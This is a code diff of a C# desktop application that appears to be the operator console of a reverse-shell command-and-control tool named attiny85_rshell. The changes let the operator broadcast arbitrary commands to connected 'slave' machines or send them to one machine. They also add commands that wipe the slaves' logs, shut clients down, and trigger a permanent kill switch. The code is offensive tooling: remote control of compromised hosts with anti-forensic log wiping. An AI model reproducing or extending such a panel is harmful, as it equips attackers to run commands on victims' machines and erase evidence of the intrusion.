@@ -43,7 +43,6 @@ namespace attiny85_rshell {
             MasterClientLaunch();
 
         }
-
         private void MasterClientLaunch() {
             string fileName = "..\\..\\..\\data\\master_client.json";
             string jsonString = File.ReadAllText(fileName);
@@ -68,56 +67,104 @@ namespace attiny85_rshell {
             myFlowDoc.Blocks.Add(new Paragraph(new Run(MasterStateObj.MasterClientObj.ClientListQuery())));
             landing_page_log.Document = myFlowDoc;
         }
-
         private void MasterClientDisconnectSlave(object sender, RoutedEventArgs e) {
+            //--client_shutdown
             if (MasterStateObj.MasterClientObj == null) {
                 System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.","Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
                 return;
             }
-            if (client_id_textbox.Text != "") {
-                try {
-                    int client_id = Int32.Parse(client_id_textbox.Text);
-                    MasterStateObj.MasterClientObj.DisconnectSlave(client_id);
-                } catch(Exception ex) {
-                    System.Windows.MessageBox.Show(ex.ToString());
-                }                
-            } else {
-                System.Windows.MessageBox.Show("Cannot use empty id value.");
-            }
-        }
-
-        private void MasterClientClearSlaveLog(object sender, RoutedEventArgs e) {
-            //RunCommand
             try {
-                int client_id = Int32.Parse(client_id_textbox.Text);
-                MasterStateObj.MasterClientObj.RunCommand(client_id, "--log_wipe");
+                if (broadcast_checkbox.IsChecked ?? true) {
+                    MasterStateObj.MasterClientObj.RunCommand("BC", "--client_shutdown", true);
+                } else {
+                    int client_id_int = Int32.Parse(client_id_textbox.Text);
+                    MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, "--client_shutdown", false);
+                }
+
             } catch (Exception ex) {
                 System.Windows.MessageBox.Show(ex.ToString());
             }
         }
+        private void MasterClientClearSlaveLog(object sender, RoutedEventArgs e) {
+            //RunCommand
+            //--log_wipe
+            if (MasterStateObj.MasterClientObj == null) {
+                System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.", "Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
+                return;
+            }
 
+            try {
+                if (broadcast_checkbox.IsChecked ?? true) {
+                    MasterStateObj.MasterClientObj.RunCommand("BC", "--log_wipe", true);
+                } else {
+                    int client_id_int = Int32.Parse(client_id_textbox.Text);
+                    MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, "--log_wipe", false);
+                }
+
+            } catch (Exception ex) {
+                System.Windows.MessageBox.Show(ex.ToString());
+            }
+        }
+        private void MasterClientSlaveKillswitch(object sender, RoutedEventArgs e) {
+            //--kill_switch
+            if (System.Windows.MessageBox.Show("Are you sure you want to permenantly shut down this/these slave connections?", "Are you sure", MessageBoxButton.YesNo, MessageBoxImage.Exclamation) == MessageBoxResult.Yes) {
+                if (MasterStateObj.MasterClientObj == null) {
+                    System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.", "Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
+                    return;
+                }
+
+                try {
+                    if (broadcast_checkbox.IsChecked ?? true) {
+                        MasterStateObj.MasterClientObj.RunCommand("BC", "--kill_switch", true);
+                    } else {
+                        int client_id_int = Int32.Parse(client_id_textbox.Text);
+                        MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, "--kill_switch", false);
+                    }
+
+                } catch (Exception ex) {
+                    System.Windows.MessageBox.Show(ex.ToString());
+                }
+            }
+        }
         private void MasterClientRunUserCommand(object sender, RoutedEventArgs e) {
             try {
-                int client_id = Int32.Parse(client_id_textbox.Text);
-                MasterStateObj.MasterClientObj.RunCommand(client_id, user_command_textbox.Text);
+                if (broadcast_checkbox.IsChecked ?? true) {
+                    System.Windows.MessageBox.Show("TRIGGER");
+                    MasterStateObj.MasterClientObj.RunCommand("BC", user_command_textbox.Text, true);
+                } else {
+                    int client_id_int = Int32.Parse(client_id_textbox.Text);
+                    MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, user_command_textbox.Text, false);
+                }
+                
             } catch (Exception ex) {
                 System.Windows.MessageBox.Show(ex.ToString());
             }
             user_command_textbox.Text = "";
         }
 
+
+
         private void MasterClientCommandEnterKeyPress(object sender, System.Windows.Input.KeyEventArgs e) {
             if (e.Key == System.Windows.Input.Key.Enter) {
+                if (MasterStateObj.MasterClientObj == null) {
+                    System.Windows.MessageBox.Show("Master client is not active. Run master client to use command.", "Client not active", MessageBoxButton.OK, MessageBoxImage.Error);
+                    return;
+                }
+
                 try {
-                    int client_id = Int32.Parse(client_id_textbox.Text);
-                    MasterStateObj.MasterClientObj.RunCommand(client_id, user_command_textbox.Text);
+                    if (broadcast_checkbox.IsChecked ?? true) {
+                        MasterStateObj.MasterClientObj.RunCommand("BC", user_command_textbox.Text, true);
+                    } else {
+                        int client_id_int = Int32.Parse(client_id_textbox.Text);
+                        MasterStateObj.MasterClientObj.RunCommand(client_id_textbox.Text, user_command_textbox.Text, false);
+                    }
+
                 } catch (Exception ex) {
                     System.Windows.MessageBox.Show(ex.ToString());
                 }
                 user_command_textbox.Text = "";
             }
         }
-
         private void MasterClientConfigureView(object sender, RoutedEventArgs e) {
             System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
             System.Windows.Controls.Panel.SetZIndex(master_client_configure_canvas, 1);
@@ -647,7 +694,7 @@ namespace attiny85_rshell {
             }
         }
         private void SlaveClientBroadcastCheckBoxClick(object sender, RoutedEventArgs e) {
-            if (broadcast_checbox.IsChecked ?? false) {
+            if (broadcast_checkbox.IsChecked ?? false) {
                 client_id_textbox.IsEnabled = false;
             } else {
                 client_id_textbox.IsEnabled = true;
